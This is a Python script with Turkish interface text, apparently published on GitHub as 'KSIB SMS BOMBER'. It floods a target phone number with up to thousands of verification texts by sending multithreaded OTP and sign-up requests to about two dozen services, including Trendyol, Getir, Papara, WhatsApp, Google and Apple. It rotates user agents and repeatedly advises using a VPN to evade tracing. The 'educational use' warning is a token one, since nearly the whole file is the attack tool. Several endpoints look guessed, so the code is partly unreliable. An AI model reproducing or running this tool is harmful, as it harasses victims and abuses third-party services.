#!/usr/bin/env python3
"""
KSIB SMS BOMBER v1.0
Çoklu Servis Destekli | Yüksek Hızlı | VPN Uyumlu
GitHub: https://github.com/ksib-71100-red/KSIB-PROTOTYPE-71100
"""

import requests
import threading
import random
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
import argparse
import sys
from colorama import init, Fore, Back, Style
import os
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class SMSBomber:
    def __init__(self):
        self.ua = UserAgent()
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.start_time = None
        self.max_sms = 0
        self.sms_sent = 0
        
        # SMS Servisleri - Türkiye odaklı
        self.services = [
            # E-ticaret
            ("Trendyol", self.trendyol_sms),
            ("Hepsiburada", self.hepsiburada_sms),
            ("N11", self.n11_sms),
            ("Morhipo", self.morhipo_sms),
            ("TrendyolMilla", self.trendyolmilla_sms),
            ("Çiçeksepeti", self.ciceksepeti_sms),
            
            # Yemek
            ("Yemeksepeti", self.yemeksepeti_sms),
            ("Getir", self.getir_sms),
            ("Migros", self.migros_sms),
            ("TrendyolGo", self.trendyolgo_sms),
            
            # Ulaşım
            ("Martı", self.martilar_sms),
            ("Uber", self.uber_sms),
            ("BiTaksi", self.bitaksi_sms),
            ("Scotty", self.scotty_sms),
            
            # Banka/Finans
            ("Papara", self.papara_sms),
            ("ininal", self.ininal_sms),
            ("Moneypay", self.moneypay_sms),
            
            # Sosyal Medya
            ("TikTok", self.tiktok_sms),
            ("Instagram", self.instagram_sms),
            ("Twitter/X", self.twitter_sms),
            
            # Diğer
            ("WhatsApp", self.whatsapp_sms),
            ("Google", self.google_sms),
            ("Apple", self.apple_sms),
            ("LCWaikiki", self.lcwaikiki_sms),
        ]
        
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + Style.BRIGHT + """
        ╔══════════════════════════════════════════════════╗
        ║           KSIB SMS BOMBER v1.0                  ║
        ║        💣 Çoklu Servis | Ultra Hızlı            ║
        ║           25+ Servis Desteği                     ║
        ║  github.com/ksib-71100-red/KSIB-PROTOTYPE-71100 ║
        ╚══════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def create_session(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        })
        return session
    
    def format_phone(self, phone):
        """Telefon numarasını formatla"""
        phone = ''.join(filter(str.isdigit, phone))
        if phone.startswith('0'):
            phone = phone[1:]
        if not phone.startswith('90'):
            phone = '90' + phone
        return phone
    
    # ==================== SMS SERVİSLERİ ====================
    
    def trendyol_sms(self, phone, session):
        try:
            url = "https://www.trendyol.com/authentication/login"
            data = {"phone": phone, "type": "register"}
            headers = {"Content-Type": "application/json", "Origin": "https://www.trendyol.com"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def hepsiburada_sms(self, phone, session):
        try:
            url = "https://www.hepsiburada.com/account/api/v1/auth/send-otp"
            data = {"phoneNumber": phone, "type": "register"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def n11_sms(self, phone, session):
        try:
            url = "https://www.n11.com/api/user/send-otp"
            data = {"phone": phone, "action": "register"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def morhipo_sms(self, phone, session):
        try:
            url = "https://www.morhipo.com/api/auth/send-code"
            data = {"phone": phone, "type": "register"}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def trendyolmilla_sms(self, phone, session):
        try:
            url = "https://www.trendyolmilla.com/api/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def ciceksepeti_sms(self, phone, session):
        try:
            url = "https://www.ciceksepeti.com/api/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def yemeksepeti_sms(self, phone, session):
        try:
            url = "https://www.yemeksepeti.com/api/auth/send-otp"
            data = {"phone": phone, "type": "register"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def getir_sms(self, phone, session):
        try:
            url = "https://api.getir.com/auth/send-code"
            data = {"phone": phone}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def migros_sms(self, phone, session):
        try:
            url = "https://www.migros.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def trendyolgo_sms(self, phone, session):
        try:
            url = "https://api.trendyolgo.com/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def martilar_sms(self, phone, session):
        try:
            url = "https://api.martilar.com/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def uber_sms(self, phone, session):
        try:
            url = "https://auth.uber.com/v2/api/send-otp"
            data = {"phone": phone}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def bitaksi_sms(self, phone, session):
        try:
            url = "https://api.bitaksi.com/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def scotty_sms(self, phone, session):
        try:
            url = "https://api.scotty.com/auth/send-otp"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def papara_sms(self, phone, session):
        try:
            url = "https://www.papara.com/api/auth/send-otp"
            data = {"phone": phone, "action": "register"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def ininal_sms(self, phone, session):
        try:
            url = "https://api.ininal.com/auth/send-otp"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def moneypay_sms(self, phone, session):
        try:
            url = "https://api.moneypay.com/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def tiktok_sms(self, phone, session):
        try:
            url = "https://www.tiktok.com/passport/account/send_code/"
            data = {"mobile": phone, "type": "1"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def instagram_sms(self, phone, session):
        try:
            url = "https://www.instagram.com/api/v1/accounts/send_signup_sms_code/"
            device_id = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
            data = {"phone": phone, "device_id": device_id}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            resp = session.post(url, data=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def twitter_sms(self, phone, session):
        try:
            url = "https://api.twitter.com/1.1/onboarding/task.json"
            data = {"phone_number": phone}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def whatsapp_sms(self, phone, session):
        try:
            url = "https://v.whatsapp.net/v2/reg_onboard_sms/request"
            data = {"cc": "90", "in": phone[2:], "method": "sms"}
            headers = {"User-Agent": "WhatsApp/2.23.25.84 Android", "Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def google_sms(self, phone, session):
        try:
            url = "https://accounts.google.com/signup/v2/webcreateaccount"
            data = {"phone": phone, "hl": "tr"}
            resp = session.post(url, data=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def apple_sms(self, phone, session):
        try:
            url = "https://idmsa.apple.com/IDMSWebAuth/verifyphone"
            data = {"phoneNumber": phone, "countryCode": "TR"}
            headers = {"Content-Type": "application/json"}
            resp = session.post(url, json=data, headers=headers, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def lcwaikiki_sms(self, phone, session):
        try:
            url = "https://www.lcwaikiki.com/api/auth/send-code"
            data = {"phone": phone}
            resp = session.post(url, json=data, timeout=10)
            return resp.status_code in [200, 201, 400]
        except: return False
    
    def send_sms_worker(self, phone, thread_id):
        """SMS gönderim işçisi"""
        session = self.create_session()
        
        while self.sms_sent < self.max_sms:
            service_name, service_func = random.choice(self.services)
            
            try:
                result = service_func(phone, session)
                
                with self.lock:
                    if self.sms_sent >= self.max_sms:
                        break
                    
                    self.sms_sent += 1
                    if result:
                        self.success_count += 1
                        status = Fore.GREEN + "✓"
                    else:
                        self.fail_count += 1
                        status = Fore.RED + "✗"
                    
                    if self.sms_sent % 25 == 0 or self.sms_sent == self.max_sms:
                        elapsed = time.time() - self.start_time
                        rate = self.sms_sent / elapsed if elapsed > 0 else 0
                        print(f"\r{status} [{service_name}] SMS {self.sms_sent}/{self.max_sms} | "
                              f"✅ {self.success_count} | ❌ {self.fail_count} | ⚡ {rate:.1f}/s", end="")
                
                time.sleep(random.uniform(0.05, 0.2))
                
            except:
                continue
    
    def start_attack(self, phone, count=100, threads=50):
        """SMS saldırısını başlat"""
        formatted_phone = self.format_phone(phone)
        self.max_sms = count
        
        print(Fore.CYAN + f"\n📱 Hedef: +{formatted_phone}")
        print(Fore.CYAN + f"📊 Hedef SMS: {count}")
        print(Fore.CYAN + f"🧵 Thread: {threads}")
        print(Fore.CYAN + f"📡 Servis: {len(self.services)} farklı servis")
        print(Fore.YELLOW + "💡 VPN açık kullanmanız önerilir!")
        print(Fore.RED + "\n💣 SALDIRI BAŞLIYOR...\n")
        
        self.start_time = time.time()
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.send_sms_worker, args=(formatted_phone, i))
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        try:
            for t in threads_list:
                while t.is_alive():
                    t.join(timeout=1)
                    if self.sms_sent >= self.max_sms:
                        break
        
        except KeyboardInterrupt:
            print(Fore.RED + "\n\n[!] Kullanıcı tarafından durduruldu!")
        
        finally:
            self.print_final_stats()
    
    def print_final_stats(self):
        """Final istatistikleri"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        total = self.success_count + self.fail_count
        rate = total / elapsed if elapsed > 0 else 0
        
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + "📊 SMS BOMBER RAPORU")
        print("="*60)
        print(Fore.WHITE + f"⏱️  Süre        : {elapsed:.1f} saniye")
        print(Fore.WHITE + f"📨 Toplam SMS   : {total}")
        print(Fore.GREEN + f"✅ Başarılı     : {self.success_count}")
        print(Fore.RED + f"❌ Başarısız    : {self.fail_count}")
        if total > 0:
            print(Fore.WHITE + f"📈 Başarı Oranı : %{self.success_count/total*100:.1f}")
        print(Fore.WHITE + f"⚡ Ort. Hız     : {rate:.1f} SMS/saniye")
        print(Fore.WHITE + f"📡 Servis       : {len(self.services)}")
        print("="*60 + "\n")

def main():
    bomber = SMSBomber()
    bomber.banner()
    
    parser = argparse.ArgumentParser(
        description='KSIB SMS Bomber v1.0 - Çoklu Servis SMS Gönderici',
        epilog='GitHub: https://github.com/ksib-71100-red/KSIB-PROTOTYPE-71100'
    )
    parser.add_argument('-p', '--phone', help='Telefon numarası (5XXXXXXXXX)')
    parser.add_argument('-c', '--count', type=int, default=100, help='SMS sayısı (varsayılan: 100)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Thread sayısı (varsayılan: 50)')
    
    args = parser.parse_args()
    
    if not args.phone:
        print(Fore.YELLOW + "📱 Hedef telefon numarasını girin:")
        print(Fore.CYAN + "   Örnek formatlar: 5XXXXXXXXX | 05XXXXXXXXX | +905XXXXXXXXX")
        phone = input(Fore.GREEN + "> ")
    else:
        phone = args.phone
    
    # SMS sayısı menüsü
    if not args.count:
        print(Fore.YELLOW + "\n📊 SMS Sayısı Seçin:")
        print(Fore.CYAN + "   1. 100 SMS (Hızlı)")
        print(Fore.CYAN + "   2. 500 SMS (Standart)")
        print(Fore.CYAN + "   3. 1000 SMS (Güçlü)")
        print(Fore.CYAN + "   4. 5000 SMS (Maximum)")
        print(Fore.CYAN + "   5. Özel sayı")
        choice = input(Fore.GREEN + "   Seçiminiz (1-5): ")
        
        count_map = {"1": 100, "2": 500, "3": 1000, "4": 5000}
        if choice in count_map:
            count = count_map[choice]
        else:
            count = int(input(Fore.GREEN + "   SMS sayısı girin: "))
    else:
        count = args.count
    
    # Thread sayısı
    threads = args.threads if args.threads else int(input(Fore.GREEN + "\n🧵 Thread sayısı (50): ") or "50")
    
    # Özet
    print(Fore.YELLOW + "\n" + "="*40)
    print(Fore.CYAN + "📋 OPERASYON ÖZETİ:")
    print(f"   📱 Telefon : {phone}")
    print(f"   📊 SMS     : {count} adet")
    print(f"   🧵 Thread  : {threads}")
    print(f"   📡 Servis  : {len(bomber.services)} farklı servis")
    print("="*40)
    
    # Onay
    print(Fore.RED + "\n⚠️  UYARI: Bu araç eğitim amaçlıdır. Kötüye kullanım suçtur!")
    print(Fore.RED + "⚠️  Sorumluluk kullanıcıya aittir!")
    confirm = input(Fore.GREEN + "\nDevam etmek istiyor musunuz? (E/H): ")
    
    if confirm.upper() != 'E':
        print(Fore.YELLOW + "\nİptal edildi.")
        sys.exit(0)
    
    print(Fore.GREEN + "\n✅ Başlatılıyor...")
    print(Fore.CYAN + "💡 VPN açmayı unutmayın!\n")
    time.sleep(1)
    
    # SALDIRIYI BAŞLAT
    bomber.start_attack(phone, count, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Program durduruldu!")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Hata: {e}")
        sys.exit(1)
